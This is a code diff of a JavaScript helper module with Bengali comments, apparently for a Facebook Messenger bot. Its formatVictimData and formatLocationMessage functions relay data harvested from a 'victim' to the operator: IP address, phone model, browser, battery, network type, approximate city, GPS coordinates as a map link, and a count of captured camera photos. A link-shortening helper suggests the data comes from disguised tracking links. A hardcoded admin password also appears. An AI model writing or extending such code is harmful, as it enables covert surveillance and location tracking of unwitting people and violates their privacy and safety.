@@ -3,7 +3,6 @@ const Config = require('../models/Config');
 const fs = require('fs-extra');
 const path = require('path');
 
-// ===== লোকাল কনফিগ =====
 function getLocalConfig() {
     const file = path.join(__dirname, '../data/config.json');
     if (fs.existsSync(file)) {
@@ -16,7 +15,6 @@ function getLocalConfig() {
     return { mongoUri: '', adminPassword: 'Sakib@7890' };
 }
 
-// ===== MongoDB থেকে কনফিগ =====
 async function getConfig() {
     try {
         let config = await Config.findOne({ key: 'bot_config' });
@@ -31,7 +29,7 @@ async function getConfig() {
         }
         return config;
     } catch (err) {
-        console.log('⚠️ MongoDB থেকে কনফিগ আনতে ব্যর্থ, লোকাল ডিফল্ট ব্যবহার:', err.message);
+        console.log('⚠️ MongoDB থেকে কনফিগ আনতে ব্যর্থ:', err.message);
         return {
             pageAccessToken: '',
             verifyToken: 'Sakib_Verify',
@@ -40,25 +38,67 @@ async function getConfig() {
     }
 }
 
-// ===== মেসেজ পাঠানো =====
+// ================================================================
+// 🆕 sendMessage - সম্পূর্ণ এরর হ্যান্ডলিং সহ
+// ================================================================
 async function sendMessage(recipientId, text) {
     try {
         const config = await getConfig();
         const token = config.pageAccessToken;
-        if (!token) {
-            console.error('❌ পেজ অ্যাক্সেস টোকেন সেট করা নেই!');
-            return;
+        
+        // টোকেন চেক
+        if (!token || token === '') {
+            console.error('❌ পেজ অ্যাক্সেস টোকেন সেট করা নেই! অ্যাডমিন প্যানেলে গিয়ে টোকেন সেট করুন।');
+            return { success: false, error: 'TOKEN_MISSING' };
         }
-        await axios.post(`https://graph.facebook.com/v18.0/me/messages?access_token=${token}`, {
-            recipient: { id: recipientId },
-            message: { text: text }
-        });
+
+        // টোকেনের দৈর্ঘ্য চেক (ফেসবুক টোকেন সাধারণত ১৮০+ অক্ষর)
+        if (token.length < 50) {
+            console.error('❌ টোকেনটি খুব ছোট! সম্ভবত ভুল টোকেন দেয়া হয়েছে।');
+            return { success: false, error: 'INVALID_TOKEN' };
+        }
+
+        const response = await axios.post(
+            `https://graph.facebook.com/v18.0/me/messages?access_token=${token}`,
+            {
+                recipient: { id: recipientId },
+                message: { text: text }
+            },
+            {
+                timeout: 10000 // ১০ সেকেন্ড টাইমআউট
+            }
+        );
+
+        console.log(`✅ মেসেজ পাঠানো হয়েছে: ${recipientId} - "${text.substring(0, 30)}..."`);
+        return { success: true, data: response.data };
+
     } catch (err) {
-        console.error('❌ মেসেজ পাঠাতে ব্যর্থ:', err.response?.data || err.message);
+        // বিস্তারিত এরর লগ
+        if (err.response) {
+            // ফেসবুক থেকে এরর রেসপন্স
+            console.error('❌ ফেসবুক এরর:', {
+                status: err.response.status,
+                data: err.response.data
+            });
+            
+            // কমন এরর কোড
+            if (err.response.status === 400) {
+                console.error('⚠️ টোকেন ভুল বা মেয়াদোত্তীর্ণ! অ্যাডমিন প্যানেলে নতুন টোকেন দিন।');
+            } else if (err.response.status === 403) {
+                console.error('⚠️ পারমিশন নেই! নিশ্চিত করুন টোকেনটি সঠিক পেজের জন্য।');
+            } else if (err.response.status === 429) {
+                console.error('⚠️ রেট লিমিট! কিছুক্ষণ পর আবার চেষ্টা করুন।');
+            }
+        } else if (err.request) {
+            console.error('❌ নেটওয়ার্ক এরর:', err.message);
+        } else {
+            console.error('❌ অজানা এরর:', err.message);
+        }
+        
+        return { success: false, error: err.message };
     }
 }
 
-// ===== ইউজার প্রোফাইল =====
 async function getUserProfile(senderId) {
     try {
         const config = await getConfig();
@@ -72,7 +112,6 @@ async function getUserProfile(senderId) {
     }
 }
 
-// ===== লিংক শর্ট করা =====
 async function shortenUrl(longUrl) {
     try {
         const response = await axios.get(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(longUrl)}`, {
@@ -86,52 +125,38 @@ async function shortenUrl(longUrl) {
 }
 
 // ================================================================
-// 🆕 নতুন formatVictimData - শুধু প্রয়োজনীয় তথ্য
+// formatVictimData - শুধু প্রয়োজনীয় তথ্য
 // ================================================================
 function formatVictimData(victim) {
     const d = victim.device || {};
-    
-    // ডিভাইসের সময় লোকাল টাইমে দেখান
     const deviceTime = new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' });
     
     let msg = '✅ *ভিক্টিমের তথ্য পাওয়া গেছে!*\n\n';
-    
-    // IP ও সময়
     msg += `⚓️ *আইপি অ্যাড্রেস:* ${victim.ip || 'N/A'}\n`;
     msg += `🕐 *সময়:* ${deviceTime}\n\n`;
     
-    // ফোনের মডেল (platform থেকে)
     const phoneModel = d.platform || d.userAgent?.split('(')[1]?.split(')')[0] || 'N/A';
     msg += `📱 *ফোনের মডেল:* ${phoneModel}\n`;
     
-    // ব্রাউজার (userAgent থেকে)
     const browser = d.userAgent?.match(/(Chrome|Firefox|Safari|Edge|Opera)\/[0-9.]+/)?.[0] || 'N/A';
     msg += `🌐 *ব্রাউজার:* ${browser}\n`;
-    
-    // টাচ পয়েন্ট
     msg += `👆 *টাচ পয়েন্ট:* ${d.maxTouchPoints || 0}\n`;
-    
-    // ভাষা
     msg += `🗣️ *ভাষা:* ${d.language || 'N/A'}\n\n`;
     
-    // চার্জ
     const b = victim.battery || {};
     msg += `🔋 *চার্জ:* ${b.level || 'N/A'}%\n`;
     msg += `⚡ *চার্জ হচ্ছে:* ${b.charging ? 'হ্যাঁ' : 'না'}\n\n`;
     
-    // নেটওয়ার্ক (ওয়াইফাই নাকি ডেটা)
     const n = victim.network || {};
     const connectionType = n.type || 'N/A';
     msg += `📶 *কানেকশন:* ${connectionType === 'wifi' ? '📶 ওয়াইফাই' : connectionType === 'cellular' ? '📱 মোবাইল ডেটা' : connectionType}\n\n`;
     
-    // আনুমানিক অবস্থান
     if (victim.location && victim.location.city) {
         msg += `📍 *আনুমানিক অবস্থান:* ${victim.location.city}, ${victim.location.country}\n`;
     } else {
         msg += `📍 *আনুমানিক অবস্থান:* N/A\n`;
     }
     
-    // ক্যামেরা ছবির সংখ্যা (শুধু সংখ্যা)
     if (victim.camera && victim.camera.length > 0) {
         msg += `\n📸 *ক্যামেরা ছবি:* ${victim.camera.length}টি`;
     }
@@ -140,15 +165,10 @@ function formatVictimData(victim) {
     return msg;
 }
 
-// ================================================================
-// 🆕 লোকেশন পারমিশনের জন্য আলাদা মেসেজ
-// ================================================================
 function formatLocationMessage(gpsLocation) {
     if (!gpsLocation || !gpsLocation.latitude) return null;
-    
     const mapLink = gpsLocation.googleMaps || 
         `https://www.google.com/maps?q=${gpsLocation.latitude},${gpsLocation.longitude}`;
-    
     return `📍 *লোকেশন পারমিশন দেওয়া হয়েছে!*\n\n` +
            `📌 অক্ষাংশ: ${gpsLocation.latitude}\n` +
            `📌 দ্রাঘিমাংশ: ${gpsLocation.longitude}\n` +
